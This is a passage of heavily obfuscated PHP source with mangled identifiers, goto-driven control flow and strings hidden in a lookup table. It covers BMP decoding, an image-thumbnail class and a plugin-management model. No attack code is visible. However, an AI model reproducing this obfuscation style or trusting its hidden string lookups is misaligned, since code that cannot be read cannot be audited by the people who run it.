($e±É±—©ìò & $FàªàÃÆ¨ñ); $fØÀèå„åë = fread($E≥ÚàÓç◊§, $D˘≤ÀÙÛÃÛ + 1 & ~1); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } for ($d ∂óºüÒÁ = 0, $AœÖ‡—¶–® = 0; $d ∂óºüÒÁ < $e±É±—©ìò; ++$d ∂óºüÒÁ, ++$CÃÚ»Ú››∏, $AœÖ‡—¶–® += $B¶ø†±ƒäï) { list(, $F‡À’òûäé) = unpack($F“¡Ü¿µË˜[1863], $fØÀèå„åë[$AœÖ‡—¶–® >> 3]); $e‰ÍÀ…øÌ‡ = $AœÖ‡—¶–® & 7; imagesetpixel($AìƒÚõÙ¯Ÿ, $CÃÚ»Ú››∏, $AÑÉ„ˆ»Úé, $DÑ¬ïÚÔ˜ã[($F‡À’òûäé & $fé˘≤—äù‚ >> $e‰ÍÀ…øÌ‡) >> $B¶”¬ì”úá - $e‰ÍÀ…øÌ‡]); } break; } break; default: $c¨çõÃ†◊ÿ = fread($E≥ÚàÓç◊§, 1); if ($c¨çõÃ†◊ÿ === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } list(, $aÉÜÁﬂú´ı, $F‡À’òûäé) = unpack($F“¡Ü¿µË˜[1862], $fØÀèå„åë . $c¨çõÃ†◊ÿ); for ($d ∂óºüÒÁ = 0, $AœÖ‡—¶–® = 0; $d ∂óºüÒÁ < $aÉÜÁﬂú´ı; ++$d ∂óºüÒÁ, ++$CÃÚ»Ú››∏, $AœÖ‡—¶–® += $B¶ø†±ƒäï) { $e‰ÍÀ…øÌ‡ = $AœÖ‡—¶–® & 7; imagesetpixel($AìƒÚõÙ¯Ÿ, $CÃÚ»Ú››∏, $AÑÉ„ˆ»Úé, $DÑ¬ïÚÔ˜ã[($F‡À’òûäé & $fé˘≤—äù‚ >> $e‰ÍÀ…øÌ‡) >> $B¶”¬ì”úá - $e‰ÍÀ…øÌ‡]); } break; } } } else { for ($f Öå¨ëÔ– = 0; $f Öå¨ëÔ– < $F«Éî¥¿íé; ++$f Öå¨ëÔ–, $AÑÉ„ˆ»Úé += $A“∂ô·âå§) { $fØÀèå„åë = fread($E≥ÚàÓç◊§, $C–°ÁØŒòË); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } $AœÖ‡—¶–® = 0; for ($CÃÚ»Ú››∏ = 0; $CÃÚ»Ú››∏ < $A”ôÌ∏; ++$CÃÚ»Ú››∏, $AœÖ‡—¶–® += $B¶ø†±ƒäï) { list(, $F‡À’òûäé) = unpack($F“¡Ü¿µË˜[1863], $fØÀèå„åë[$AœÖ‡—¶–® >> 3]); $e‰ÍÀ…øÌ‡ = $AœÖ‡—¶–® & 7; imagesetpixel($AìƒÚõÙ¯Ÿ, $CÃÚ»Ú››∏, $AÑÉ„ˆ»Úé, $DÑ¬ïÚÔ˜ã[($F‡À’òûäé & $fé˘≤—äù‚ >> $e‰ÍÀ…øÌ‡) >> $B¶”¬ì”úá - $e‰ÍÀ…øÌ‡]); } } } goto E◊è≠óÂ¢Ÿ; b©ÖŒêÂ †: $DÑ¬ïÚÔ˜ã = array(); for ($d ∂óºüÒÁ = 0; $d ∂óºüÒÁ < $e∏ô◊ëèŸº; ++$d ∂óºüÒÁ) { $fØÀèå„åë = fread($E≥ÚàÓç◊§, $dÿø∆È≤‹ì); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } extract(unpack($F“¡Ü¿µË˜[1859], $fØÀèå„åë . $F“¡Ü¿µË˜[1858])); $DÑ¬ïÚÔ˜ã[] = imagecolorallocate($AìƒÚõÙ¯Ÿ, $a≈‚ıª≠⁄„, $C∂»ë”¨©®, $e‰ÍÀ…øÌ‡); } $B¶”¬ì”úá = 8 - $B¶ø†±ƒäï; goto C‘Ùà‚Ωéà; CÈ‡¥Áà¬: $AìƒÚõÙ¯Ÿ = imagecreate($A”ôÌ∏, $F«Éî¥¿íé); $dÿø∆È≤‹ì = $aîÏ£°Ü‘µ == 12 ? 3 : 4; $e∏ô◊ëèŸº = $A√¶ÀÖŸ™© ? $A√¶ÀÖŸ™© : pow(2, $B¶ø†±ƒäï); goto b©ÖŒêÂ †; E◊è≠óÂ¢Ÿ: } else { goto AŒ—àôüÙ›; F÷ƒó—¶’Æ: $b‚∏Ô•å•Û = $b…£•ë∞Ãø ? 1 / $b…£•ë∞Ãø : 1; $fÙü…ççÿÃ = $f»—ı” ü÷ ? 1 / $f»—ı” ü÷ : 1; $aëúœ¬ªÆ≠ = $A€Âæô∑ˆå ? 1 / $A€Âæô∑ˆå : 1; goto c·Ÿèºêµß; fˆçàÈöë√: $fƒ¬àΩ¶Îÿ = $B¶ø†±ƒäï >> 3; $Dä·ŒØﬂùÏ = $c√÷Á÷ÓáÌ ? 127 : 0; $EÓù»òÙàƒ = $c√÷Á÷ÓáÌ ? 1 / $c√÷Á÷ÓáÌ : 1; goto F÷ƒó—¶’Æ; AŒ—àôüÙ›: $AìƒÚõÙ¯Ÿ = imagecreatetruecolor($A”ôÌ∏, $F«Éî¥¿íé); imagealphablending($AìƒÚõÙ¯Ÿ, !1); if ($c√÷Á÷ÓáÌ) { imagesavealpha($AìƒÚõÙ¯Ÿ, !0); } goto fˆçàÈöë√; c·Ÿèºêµß: for ($f Öå¨ëÔ– = 0; $f Öå¨ëÔ– < $F«Éî¥¿íé; ++$f Öå¨ëÔ–, $AÑÉ„ˆ»Úé += $A“∂ô·âå§) { $fØÀèå„åë = fread($E≥ÚàÓç◊§, $C–°ÁØŒòË); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } $AœÖ‡—¶–® = 0; for ($CÃÚ»Ú››∏ = 0; $CÃÚ»Ú››∏ < $A”ôÌ∏; ++$CÃÚ»Ú››∏, $AœÖ‡—¶–® += $fƒ¬àΩ¶Îÿ) { list(, $F‡À’òûäé) = unpack($F“¡Ü¿µË˜[1840], substr($fØÀèå„åë, $AœÖ‡—¶–®, $fƒ¬àΩ¶Îÿ) . $F“¡Ü¿µË˜[1864]); $F¨…∑âÆö† = $F‡À’òûäé & $c√÷Á÷ÓáÌ; $E¿–∑√·ö√ = $F‡À’òûäé & $b…£•ë∞Ãø; $A¯…§Í¢ë° = $F‡À’òûäé & $f»—ı” ü÷; $AÌù¶√ëÓ– = $F‡À’òûäé & $A€Âæô∑ˆå; $dóÁãèøÔú = $Dä·ŒØﬂùÏ - (($F¨…∑âÆö† << 7) - $F¨…∑âÆö†) * $EÓù»òÙàƒ; $a≈‚ıª≠⁄„ = (($E¿–∑√·ö√ << 8) - $E¿–∑√·ö√) * $b‚∏Ô•å•Û; $C∂»ë”¨©® = (($A¯…§Í¢ë° << 8) - $A¯…§Í¢ë°) * $fÙü…ççÿÃ; $e‰ÍÀ…øÌ‡ = (($AÌù¶√ëÓ– << 8) - $AÌù¶√ëÓ–) * $aëúœ¬ªÆ≠; imagesetpixel($AìƒÚõÙ¯Ÿ, $CÃÚ»Ú››∏, $AÑÉ„ˆ»Úé, $dóÁãèøÔú << 24 | $a≈‚ıª≠⁄„ << 16 | $C∂»ë”¨©® << 8 | $e‰ÍÀ…øÌ‡); } } imagealphablending($AìƒÚõÙ¯Ÿ, !0); goto cºƒ—∂Ü®‹; cºƒ—∂Ü®‹: } return $AìƒÚõÙ¯Ÿ; goto B–¢èØ÷ö‰; B–¢èØ÷ö‰: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($EÉ¶£à∞Íê, $D◊—àÔ±øﬂ) { goto F¿·ìÁá‹õ; Aú’ú¯ƒï≈: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fëÿﬁ‘æÚà; A‡…ÆÇºÏü: if (!$this->im) { return !1; } $bÃ“◊ÌËı£ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][33]; $this->imgData = GetImageSize($EÉ¶£à∞Íê, $bÃ“◊ÌËı£); goto Aú’ú¯ƒï≈; F¿·ìÁá‹õ: $this->srcFile = $EÉ¶£à∞Íê; $this->echoType = $D◊—àÔ±øﬂ; $this->im = self::image($EÉ¶£à∞Íê); goto A‡…ÆÇºÏü; fëÿﬁ‘æÚà: } public static function image($aƒÉÛÇñı¬) { $F°ïùÊå¿≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c∑—öÍÑ∏Œ = $F°ïùÊå¿≈[33]; $dà±”¬éë´ = GetImageSize($aƒÉÛÇñı¬, $c∑—öÍÑ∏Œ); $c£è·õ±◊≈ = !1; switch ($dà±”¬éë´[2]) { case IMAGETYPE_GIF: if (!function_exists($F°ïùÊå¿≈[1865])) { break; } $c£è·õ±◊≈ = imagecreatefromgif($aƒÉÛÇñı¬); break; case IMAGETYPE_JPEG: if (!function_exists($F°ïùÊå¿≈[1866])) { break; } $c£è·õ±◊≈ = imagecreatefromjpeg($aƒÉÛÇñı¬); break; case IMAGETYPE_PNG: if (!function_exists($F°ïùÊå¿≈[1867])) { break; } $c£è·õ±◊≈ = @imagecreatefrompng($aƒÉÛÇñı¬); imagesavealpha($c£è·õ±◊≈, !0); break; case IMAGETYPE_XBM: $c£è·õ±◊≈ = imagecreatefromxbm($aƒÉÛÇñı¬); break; case IMAGETYPE_WBMP: $c£è·õ±◊≈ = imagecreatefromwbmp($aƒÉÛÇñı¬); break; case IMAGETYPE_BMP: $c£è·õ±◊≈ = imagecreatefrombmp($aƒÉÛÇñı¬); break; default: break; } return $c£è·õ±◊≈; } public static function imageSize($a∫‹òë¿ƒ√) { $AôàÀÉÿµÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÜ¶õƒº≈õ = GetImageSize($a∫‹òë¿ƒ√); if (!$dÜ¶õƒº≈õ) { return !1; } return array($AôàÀÉÿµÓ[1868] => $dÜ¶õƒº≈õ[0], $AôàÀÉÿµÓ[1869] => $dÜ¶õƒº≈õ[1]); } function distortion($Fˆ±‰éÿëÔ, $F•≠Î¡„ˆ‡, $c∏‹É∫ıﬁß) { $Dëêœìƒ”‚ = $this->creatImage($this->im, $F•≠Î¡„ˆ‡, $c∏‹É∫ıﬁß, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Dëêœìƒ”‚, $Fˆ±‰éÿëÔ); } function prorate($C˘Ç≈•‰Ê’, $a∞ﬂ¡‘π“∫, $FÙÉ„∫”÷∑) { $Eé©ûöÛé‰ = $a∞ﬂ¡‘π“∫ / $FÙÉ„∫”÷∑; $bú€‹Âÿ∏ç = $this->srcW / $this->srcH; if ($Eé©ûöÛé‰ <= $bú€‹Âÿ∏ç) { $D«êƒ∫ìÊ© = $a∞ﬂ¡‘π“∫; $dëÑÕœ”Æì = $D«êƒ∫ìÊ© * ($this->srcH / $this->srcW); } else { $dëÑÕœ”Æì = $FÙÉ„∫”÷∑; $D«êƒ∫ìÊ© = $dëÑÕœ”Æì * ($this->srcW / $this->srcH); } if ($this->srcW > $a∞ﬂ¡‘π“∫ || $this->srcH > $FÙÉ„∫”÷∑) { $Fâ•ôá¨∫û = $this->creatImage($this->im, $D«êƒ∫ìÊ©, $dëÑÕœ”Æì, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Fâ•ôá¨∫û, $C˘Ç≈•‰Ê’); } else { $Fâ•ôá¨∫û = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Fâ•ôá¨∫û, $C˘Ç≈•‰Ê’); } } function cut($Eæ⁄¶Éá¿Ÿ, $D™Â¿ì≤”Ü, $A–ÍªÒËÊﬁ) { goto fâª´ﬂ¬ä; fâª´ﬂ¬ä: $Fû÷âÇŸçô = $D™Â¿ì≤”Ü / $A–ÍªÒËÊﬁ; $FØπΩ∑œÎÏ = $this->srcW / $this->srcH; if ($Fû÷âÇŸçô <= $FØπΩ∑œÎÏ) { $B ∑ÉÎä≈¢ = $A–ÍªÒËÊﬁ; $cè≥€Ç±ì∫ = $B ∑ÉÎä≈¢ * ($this->srcW / $this->srcH); } else { $cè≥€Ç±ì∫ = $D™Â¿ì≤”Ü; $B ∑ÉÎä≈¢ = $cè≥€Ç±ì∫ * ($this->srcH / $this->srcW); } goto c◊ñÇ—ÌÇ›; c◊ñÇ—ÌÇ›: $B‡¢ºçØÆÙ = $this->creatImage($this->im, $cè≥€Ç±ì∫, $B ∑ÉÎä≈¢, 0, 0, 0, 0, $this->srcW, $this->srcH); $c¶´¬∏ÎÉ— = $this->creatImage($B‡¢ºçØÆÙ, $D™Â¿ì≤”Ü, $A–ÍªÒËÊﬁ, 0, 0, ($cè≥€Ç±ì∫ - $D™Â¿ì≤”Ü) / 2, ($B ∑ÉÎä≈¢ - $A–ÍªÒËÊﬁ) / 2, $D™Â¿ì≤”Ü, $A–ÍªÒËÊﬁ); imageDestroy($B‡¢ºçØÆÙ); goto Böò—◊‡¡í; Böò—◊‡¡í: return $this->echoImage($c¶´¬∏ÎÉ—, $Eæ⁄¶Éá¿Ÿ); goto a·◊Ù«êÁ; a·◊Ù«êÁ: } function backFill($AÀ≥ÈΩ…Â, $FÛ¬ëéœÇ◊, $C¿Œ⁄⁄⁄éû, $Fë»˜ûπá‘ = false, $a≈≥õ“¬ú» = 255, $AÜ›ëäóßÓ = 255, $aÓŒàüØ©ò = 255) { goto eÀ‹ÕæñÚÀ; BÂáƒ∞§’°: return $this->echoImage($CàáœÑêøû, $AÀ≥ÈΩ…Â); goto F€Áãﬂ¡Û€; eÀ‹ÕæñÚÀ: $a≤¶Ê˜Âé≥ = $FÛ¬ëéœÇ◊ / $C¿Œ⁄⁄⁄éû; $CÈ®≠ÍﬁÈî = $this->srcW / $this->srcH; if ($a≤¶Ê˜Âé≥ <= $CÈ®≠ÍﬁÈî) { $aÒà°§—œË = $FÛ¬ëéœÇ◊; $B˜ŸÀ™Üù‡ = $aÒà°§—œË * ($this->srcH / $this->srcW); } else { $B˜ŸÀ™Üù‡ = $C¿Œ⁄⁄⁄éû; $aÒà°§—œË = $B˜ŸÀ™Üù‡ * ($this->srcW / $this->srcH); } goto b∑Îƒ«õ´•; b∑Îƒ«õ´•: if (function_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1870])) { @($CàáœÑêøû = imageCreateTrueColor($FÛ¬ëéœÇ◊, $C¿Œ⁄⁄⁄éû)); if (!$CàáœÑêøû) { $CàáœÑêøû = imageCreate($FÛ¬ëéœÇ◊, $C¿Œ⁄⁄⁄éû); } } else { $CàáœÑêøû = imageCreate($FÛ¬ëéœÇ◊, $C¿Œ⁄⁄⁄éû); } $eâµ«º‹ÒÖ = ($C¿Œ⁄⁄⁄éû - $B˜ŸÀ™Üù‡) / 2; $BÈü»˘Ñı› = imagecolorallocate($CàáœÑêøû, $a≈≥õ“¬ú», $AÜ›ëäóßÓ, $aÓŒàüØ©ò); goto D„àÍ∫“‘¥; D„àÍ∫“‘¥: if ($Fë»˜ûπá‘) { $BÈü»˘Ñı› = imageColorTransparent($CàáœÑêøû, $BÈü»˘Ñı›); $eâµ«º‹ÒÖ = $C¿Œ⁄⁄⁄éû - $B˜ŸÀ™Üù‡; } imageFilledRectangle($CàáœÑêøû, 0, 0, $FÛ¬ëéœÇ◊, $C¿Œ⁄⁄⁄éû, $BÈü»˘Ñı›); if ($this->srcW > $FÛ¬ëéœÇ◊ || $this->srcH > $C¿Œ⁄⁄⁄éû) { $FÕ‰Ω˜ÕﬁÒ = $this->creatImage($this->im, $aÒà°§—œË, $B˜ŸÀ™Üù‡, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($aÒà°§—œË < $FÛ¬ëéœÇ◊) { imageCopy($CàáœÑêøû, $FÕ‰Ω˜ÕﬁÒ, ($FÛ¬ëéœÇ◊ - $aÒà°§—œË) / 2, 0, 0, 0, $aÒà°§—œË, $B˜ŸÀ™Üù‡); } else { if ($B˜ŸÀ™Üù‡ < $C¿Œ⁄⁄⁄éû) { imageCopy($CàáœÑêøû, $FÕ‰Ω˜ÕﬁÒ, 0, $eâµ«º‹ÒÖ, 0, 0, $aÒà°§—œË, $B˜ŸÀ™Üù‡); } else { imageCopy($CàáœÑêøû, $FÕ‰Ω˜ÕﬁÒ, 0, 0, 0, 0, $aÒà°§—œË, $B˜ŸÀ™Üù‡); } } } else { imageCopyMerge($CàáœÑêøû, $this->im, ($FÛ¬ëéœÇ◊ - $aÒà°§—œË) / 2, $eâµ«º‹ÒÖ, 0, 0, $aÒà°§—œË, $B˜ŸÀ™Üù‡, 100); } goto BÂáƒ∞§’°; F€Áãﬂ¡Û€: } function creatImage($aÑŒ‡ÔùëÓ, $EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√, $e±éá÷é¯…, $D•¨˜≠‡òÎ, $d…á±≤∆œÆ, $dÓ∑àºÆÂ•, $c•Áæü√Ë», $F÷Ï®œ£ŒΩ) { if (function_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1870])) { @($fäª≠Æ⁄éä = ImageCreateTrueColor($EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√)); @imagealphablending($fäª≠Æ⁄éä, !1); @imagesavealpha($fäª≠Æ⁄éä, !0); if ($fäª≠Æ⁄éä) { imageCopyResampled($fäª≠Æ⁄éä, $aÑŒ‡ÔùëÓ, $e±éá÷é¯…, $D•¨˜≠‡òÎ, $d…á±≤∆œÆ, $dÓ∑àºÆÂ•, $EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√, $c•Áæü√Ë», $F÷Ï®œ£ŒΩ); } else { $fäª≠Æ⁄éä = ImageCreate($EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√); imageCopyResized($fäª≠Æ⁄éä, $aÑŒ‡ÔùëÓ, $e±éá÷é¯…, $D•¨˜≠‡òÎ, $d…á±≤∆œÆ, $dÓ∑àºÆÂ•, $EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√, $c•Áæü√Ë», $F÷Ï®œ£ŒΩ); } } else { $fäª≠Æ⁄éä = ImageCreate($EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√); imageCopyResized($fäª≠Æ⁄éä, $aÑŒ‡ÔùëÓ, $e±éá÷é¯…, $D•¨˜≠‡òÎ, $d…á±≤∆œÆ, $dÓ∑àºÆÂ•, $EÚ◊–ƒ¨àŒ, $Dñ¡∆ì°ƒ√, $c•Áæü√Ë», $F÷Ï®œ£ŒΩ); } return $fäª≠Æ⁄éä; } public function imgRotate($aÚèüú”ÛÚ, $e ÿˆ•áà°) { goto A¥ëÿó®Æ¯; Aêû¡ÎÇúÌ: return $DãÕ‚õππã; goto F¶Ãÿ¨≥·‘; f÷ ÌîΩ’ì: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $DãÕ‚õππã = imagegif($Cº†ø∆•»√, $aÚèüú”ÛÚ); break; case IMAGETYPE_JPEG: $DãÕ‚õππã = imagejpeg($Cº†ø∆•»√, $aÚèüú”ÛÚ, 100); break; case IMAGETYPE_PNG: $DãÕ‚õππã = imagePNG($Cº†ø∆•»√, $aÚèüú”ÛÚ); break; default: break; } imageDestroy($Cº†ø∆•»√); imageDestroy($this->im); goto Aêû¡ÎÇúÌ; A¥ëÿó®Æ¯: if (!$this->im || $e ÿˆ•áà° % 360 === 0 || !function_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1871])) { return !1; } $Cº†ø∆•»√ = imageRotate($this->im, 360 - $e ÿˆ•áà°, 0); $DãÕ‚õππã = !1; goto f÷ ÌîΩ’ì; F¶Ãÿ¨≥·‘: } function echoImage($dÖﬂ±ÑÜç’, $eëíÍ£óúŒ) { goto b£äõ¡∫êë; c¿¯◊≤ÛŒ¨: imageDestroy($this->im); return $AÙ›üÙíç≥; goto a––ÒÜÛÇ„; d≤õíµﬂËÂ: $AÙ›üÙíç≥ = !1; switch ($this->echoType) { case $aÇ¿Ê°¥µÑ[1872]: $AÙ›üÙíç≥ = imagePNG($dÖﬂ±ÑÜç’); break; case $aÇ¿Ê°¥µÑ[167]: $AÙ›üÙíç≥ = imagePNG($dÖﬂ±ÑÜç’, $eëíÍ£óúŒ); break; } imageDestroy($dÖﬂ±ÑÜç’); goto c¿¯◊≤ÛŒ¨; b£äõ¡∫êë: $aÇ¿Ê°¥µÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$dÖﬂ±ÑÜç’) { return !1; } ob_get_clean(); goto d≤õíµﬂËÂ; a––ÒÜÛÇ„: } } goto c¥íçÁÛ¨ã; fﬂùƒ˘øÔˆ: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x70\154\165\147\151\156\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x73\x74\141\x74\165\163", "\162\x65\x67\151\x65\163\164", "\x63\157\x6e\146\151\147"); public function loadList($CÖ÷øã∆òÈ = false) { $aπÂÚëä„´ = array_to_keyvalue($this->listData(), $_SERVER[Ä¿¡‡öóµŸﬂ‡][28]); if ($CÖ÷øã∆òÈ) { return $aπÂÚëä„´[$CÖ÷øã∆òÈ]; } return $aπÂÚëä„´; } public function init() { $FÑ’¶ãç¥ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Hook::trigger($FÑ’¶ãç¥ã[2195]); $F›ÛÇ°ŸÍú = $this->loadPluginList(); foreach ($F›ÛÇ°ŸÍú as $CõÜ‰©¡œä => $f·∫–æè¥) { $e‡‚Æ°¬è© = $this->appAllow($CõÜ‰©¡œä, $f·∫–æè¥); if (!$e‡‚Æ°¬è©) { continue; } foreach ($f·∫–æè¥[$FÑ’¶ãç¥ã[2196]] as $fÌè≥ó‡ùù => $B∆™£ÿ˘îñ) { Hook::bind($fÌè≥ó‡ùù, $B∆™£ÿ˘îñ); } } Hook::trigger($FÑ’¶ãç¥ã[2197]); Hook::trigger(ACTION); } public function appAllow($eÓæı∂ﬁøô, $e‰‹É◊èı˘, $FüêÂçßÕ– = true) { $cù‘›‘¢·™ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B∞Ç¿ï‹éÆ = PLUGIN_DIR . $eÓæı∂ﬁøô . $cù‘›‘¢·™[2198]; if (!is_array($e‰‹É◊èı˘) || !is_array($e‰‹É◊èı˘[$cù‘›‘¢·™[2196]]) || !is_file($B∞Ç¿ï‹éÆ) || $e‰‹É◊èı˘[$cù‘›‘¢·™[689]] != 1) { return !1; } if ($FüêÂçßÕ– && !Action($cù‘›‘¢·™[2199])->checkAuth($eÓæı∂ﬁøô)) { return !1; } return !0; } public function unInstall($eß ç≥∂“†) { $Eƒó¥£±Ñã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E¶ﬂÃÀ¬— = $this->loadList($eß ç≥∂“†); if (file_exists(PLUGIN_DIR . $eß ç≥∂“†)) { Hook::apply($eß ç≥∂“† . $Eƒó¥£±Ñã[2200]); } $this->remove($E¶ﬂÃÀ¬—[$Eƒó¥£±Ñã[367]]); } public function changeStatus($e‰‚Õúõâ”, $dæÉŸ≥Á≤≈) { $dê‹Üåô¢˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C›ÎÏ˘ïõå = $this->loadList($e‰‚Õúõâ”); if ($dæÉŸ≥Á≤≈) { Hook::apply($e‰‚Õúõâ” . $dê‹Üåô¢˘[2201]); } $this->update($C›ÎÏ˘ïõå[$dê‹Üåô¢˘[367]], array($dê‹Üåô¢˘[2202] => $dæÉŸ≥Á≤≈)); } public function appRegist($eõËÔçØêŒ, $e∫Ì’‘±Ÿä) { $dıÇﬁëûúø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÆÁ™â£¡æ = $this->loadList($eõËÔçØêŒ); if ($AÆÁ™â£¡æ) { $this->update($AÆÁ™â£¡æ[$dıÇﬁëûúø[367]], array($dıÇﬁëûúø[2196] => $e∫Ì’‘±Ÿä)); } else { $B„”€Ê·ÚÊ = array($dıÇﬁëûúø[28] => $eõËÔçØêŒ, $dıÇﬁëûúø[2196] => $e∫Ì’‘±Ÿä, $dıÇﬁëûúø[689] => 0, $dıÇﬁëûúø[6] => $this->getConfigDefault($eõËÔçØêŒ)); $this->insert($B„”€Ê·ÚÊ); } } public function getConfigDefault($b‹öÖﬁÑπ∫) { $fñŒûˆæ©· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÓ±’÷ÃôÖ = array(); $FüáƒÊŒ∂é = $this->getPackageJson($b‹öÖﬁÑπ∫); if (!$FüáƒÊŒ∂é && is_array($FüáƒÊŒ∂é[$fñŒûˆæ©·[2203]])) { return $cÓ±’÷ÃôÖ; } foreach ($FüáƒÊŒ∂é[$fñŒûˆæ©·[2203]] as $D‚˘é√‚—Ù => $E∏ô–∂€Ÿé) { if (!isset($E∏ô–∂€Ÿé[$fñŒûˆæ©·[359]]) || isset($cÓ±’÷ÃôÖ[$D‚˘é√‚—Ù])) { continue; } $cÓ±’÷ÃôÖ[$D‚˘é√‚—Ù] = $E∏ô–∂€Ÿé[$fñŒûˆæ©·[359]]; } return $cÓ±’÷ÃôÖ; } public function getPackageJson($e˜È÷ôåÓﬂ) { return Hook::apply($e˜È÷ôåÓﬂ . $_SERVER[Ä¿¡‡öóµŸﬂ‡][2204]); } public function getConfig($dõ∑êë°ãç, $Bú‘‘∂ï—ˆ = false) { $Aùè®òÓæâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a‡¢´Ö ‹ë = array(); $EÍÛ€å∑Ø” = $this->loadList($dõ∑êë°ãç); if ($EÍÛ€å∑Ø” && is_array($EÍÛ€å∑Ø”[$Aùè®òÓæâ[6]])) { $a‡¢´Ö ‹ë = $EÍÛ€å∑Ø”[$Aùè®òÓæâ[6]]; } if (!$a‡¢´Ö ‹ë || $Bú‘‘∂ï—ˆ) { $a‡¢´Ö ‹ë = $this->getConfigDefault($dõ∑êë°ãç); } return $a‡¢´Ö ‹ë; } public function setConfig($EÈÚø¯∞êˆ, $eí∫≤üÕñŒ = false) { goto e£—Ãì…ù€; e£—Ãì…ù€: $fÇ√≥ñ≈äü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e‹ù™ë˜Òà = $this->loadList($EÈÚø¯∞êˆ); if (!$e‹ù™ë˜Òà) { return !1; } goto fà±ªù¯·≤; fà±ªù¯·≤: $A—öı≥æøç = $e‹ù™ë˜Òà[$fÇ√≥ñ≈äü[6]]; if ($eí∫≤üÕñŒ == !1) { $A—öı≥æøç = array(); $eí∫≤üÕñŒ = $this->getConfigDefault($EÈÚø¯∞êˆ); } foreach ($eí∫≤üÕñŒ as $AÓ¿¶≈Ñ°¡ => $EﬂŸ¶±± ÿ) { $A—öı≥æøç[$AÓ¿¶≈Ñ°¡] = is_string($EﬂŸ¶±± ÿ) ? trim($EﬂŸ¶±± ÿ) : $EﬂŸ¶±± ÿ; } goto aÔ°¨ﬂØê£; aÔ°¨ﬂØê£: $this->update($e‹ù™ë˜Òà[$fÇ√≥ñ≈äü[367]], array($fÇ√≥ñ≈äü[6] => $A—öı≥æøç)); goto eó†áèµÀ°; eó†áèµÀ°: } public function viewList() { goto EŸ¥Ç—∂˜å; BìÌñÁìë¡: return $EÃ¨æéë; goto e’å¨ÔâùÍ; EŸ¥Ç—∂˜å: $aÈƒ® íıú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÖΩûûìÃ√ = $this->loadList(); $this->pluginScan($eÖΩûûìÃ√); goto cÁë‚éçÚΩ; cÁë‚éçÚΩ: $eÖΩûûìÃ√ = $this->loadPluginList(); $EÃ¨æéë = array(); foreach ($eÖΩûûìÃ√ as $cï∂ìå°ñ§ => $dÍ‘÷èÖÌâ) { unset($dÍ‘÷èÖÌâ[$aÈƒ® íıú[2196]], $dÍ‘÷èÖÌâ[$aÈƒ® íıú[6]]); $A¯ÇãÆ™‚‚ = PLUGIN_DIR . $dÍ‘÷èÖÌâ[$aÈƒ® íıú[28]] . $aÈƒ® íıú[2198]; if (!is_file($A¯ÇãÆ™‚‚)) { continue; } $A—Ÿ∫ˆﬁúÜ = Hook::apply($dÍ‘÷èÖÌâ[$aÈƒ® íıú[28]] . $aÈƒ® íıú[2204]); if (is_array($A—Ÿ∫ˆﬁúÜ)) { $EÃ¨æéë[$cï∂ìå°ñ§] = array_merge($dÍ‘÷èÖÌâ, $A—Ÿ∫ˆﬁúÜ); } } goto BìÌñÁìë¡; e’å¨ÔâùÍ: } private function loadPluginList() { $BêÓ¨è¡ÎÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÜ∞≤õ¶ñÀ = $this->loadList(); if (strtolower(MOD) == $BêÓ¨è¡ÎÛ[2205]) { return $fÜ∞≤õ¶ñÀ; } $CÂé„‘˘ñâ = Hook::trigger($BêÓ¨è¡ÎÛ[2206], $fÜ∞≤õ¶ñÀ); if ($fÜ∞≤õ¶ñÀ && !$CÂé„‘˘ñâ) { die; } return $CÂé„‘˘ñâ ? $CÂé„‘˘ñâ : $fÜ∞≤õ¶ñÀ; } private function pluginScan($D•¨´∂Æêó) { $CŸûæù∆µπ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; recursion_dir(PLUGIN_DIR, $FÌ‰¬º‡ç´, $eüñÂ±∞ò¶, 0); foreach ($FÌ‰¬º‡ç´ as $aã·¢©Ëå—) { $c›¨ï˜ôèÑ = get_path_this($aã·¢©Ëå—); if (isset($D•¨´∂Æêó[$c›¨ï˜ôèÑ]) || !file_exists($aã·¢©Ëå— . $CŸûæù∆µπ[2207]) || !file_exists($aã·¢©Ëå— . $CŸûæù∆µπ[2198])) { continue; } 